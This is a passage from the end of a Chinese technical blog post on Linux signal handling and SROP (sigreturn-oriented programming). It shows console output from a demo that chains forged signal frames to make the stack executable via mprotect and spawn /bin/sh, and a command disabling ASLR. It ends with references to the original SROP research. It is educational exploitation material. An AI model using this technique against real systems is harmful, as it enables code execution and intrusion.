<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Please press Enter to activate this console.  # </span><br><span class="line"><span class="meta">#</span><span class="bash"> ./main</span> </span><br><span class="line">00400000-00479000 r-xp 00000000 00:02 5                                  /main</span><br><span class="line">00489000-0048a000 r--p 00079000 00:02 5                                  /main</span><br><span class="line">0048a000-0048c000 rw-p 0007a000 00:02 5                                  /main</span><br><span class="line">0048c000-0048f000 rw-p 00000000 00:00 0 </span><br><span class="line">2dedf000-2df01000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">ffffbaf5a000-ffffbaf5c000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">ffffbaf5c000-ffffbaf5d000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffccde0000-ffffcce01000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line"> </span><br><span class="line">[+] sigreturn addr:0xffffbaf5c85c, syscall_ret addr:0x4006e4</span><br><span class="line">[+] add to sigframe(0x00ffffccdff100): mprotect(0xffffccdff000, 1000, 7); </span><br><span class="line">[+][kernel] mprotect called with addr:0000ffffccdff000, len:1000, prot:7                  ## 内核日志，mprotect 调用时打印信息</span><br><span class="line">[+] test mprotect RWX succeed!</span><br><span class="line">[+] add to sigframe(0x0000002dee13d0): execve(/bin/sh, 0x2dee2620, (nil)); </span><br><span class="line">[+] add to sigframe(0x00ffffccdff0f0): mprotect(0x400000, 1000, 7); </span><br><span class="line">[+][kernel] mprotect called with addr:0000000000400000, len:1000, prot:7                  ## 内核日志，mprotect 调用时打印信息</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span>                                                                                     <span class="comment">## 两个 exit 退出, /bin/sh 执行成功</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line">Please press Enter to activate this console.</span><br></pre></td></tr></table></figure>

<p>PS：vdso 的地址是通过 mmap 分配出来的，故用户态 ASLR 可以对攻击者增加一个 infoleak 的难度，randomize_va_space &gt;=1 时用户态进程开启 VDSO（mmap） 随机化[4]。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/self/maps|grep vdso</span><br><span class="line">ffffaf823000-ffffaf824000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">/ # cat /proc/self/maps|grep vdso</span><br><span class="line">ffffbb68a000-ffffbb68b000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line"> </span><br><span class="line">/ # echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">/ # cat /proc/self/maps|grep vdso</span><br><span class="line">fffff7fff000-fffff8000000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">/ # cat /proc/self/maps|grep vdso</span><br><span class="line">fffff7fff000-fffff8000000 r-xp 00000000 00:00 0                          [vdso]</span><br></pre></td></tr></table></figure>

<p> 参考资料:</p>
<p>[0] 《Linux/Unix 系统编程手册》</p>
<p>[1] <a target="_blank" rel="noopener" href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">Framing Signals – A Return to Portable Shellcode</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">Framing Signals – A Return to Portable Shellcode(slides)</a></p>
<p>[3] <a target="_blank" rel="noopener" href="https://www.wangan.com/docs/1081">SROP_「二进制安全pwn基础」 - 网安</a></p>
<p>[4] <a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html">https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html</a></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/gabithume">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#linux-%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E-SROP"><span class="toc-number">1.</span> <span class="toc-text">linux 中的信号处理与 SROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">一、基本概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E7%9A%84%E8%AE%BE%E7%BD%AE"><span class="toc-number">3.</span> <span class="toc-text">二、信号处理函数的设置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BF%A1%E5%8F%B7%E7%9A%84%E5%8F%91%E9%80%81"><span class="toc-number">4.</span> <span class="toc-text">三、信号的发送</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BF%A1%E5%8F%B7%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E7%AD%89%E5%BE%85"><span class="toc-number">5.</span> <span class="toc-text">四、信号的处理与等待</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 信号处理概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E7%9A%84%E6%97%B6%E6%9C%BA"><span class="toc-number">5.1.1.</span> <span class="toc-text">1. 信号处理的时机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E6%8F%8F%E8%BF%B0"><span class="toc-number">5.1.2.</span> <span class="toc-text">2. 信号处理流程描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%BE%E4%BE%8B"><span class="toc-number">5.1.3.</span> <span class="toc-text">3、信号处理举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-EL0-%E5%BC%82%E5%B8%B8%E8%BF%94%E5%9B%9E%E5%89%8D%E7%9A%84%E4%B8%AD%E6%96%AD%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%A4%84%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 EL0 异常返回前的中断检查与处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%AE%8C%E6%AF%95%E5%90%8E%E6%81%A2%E5%A4%8D%E7%94%A8%E6%88%B7%E6%80%81%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">5.3.</span> <span class="toc-text">4.3 中断处理函数执行完毕后恢复用户态上下文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%BE%E4%BE%8B"><span class="toc-number">5.4.</span> <span class="toc-text">4.4 内核线程信号处理举例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81SROP-%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text">五、SROP 原理与安全性分析</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&text="><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&is_video=false&description="><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&title="><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/07/linux%20%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E4%B8%8E%20SROP/&name=&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2022 John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/gabithume">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<link rel="stylesheet" href="/lib/meslo-LG/styles.css">


<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">



<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


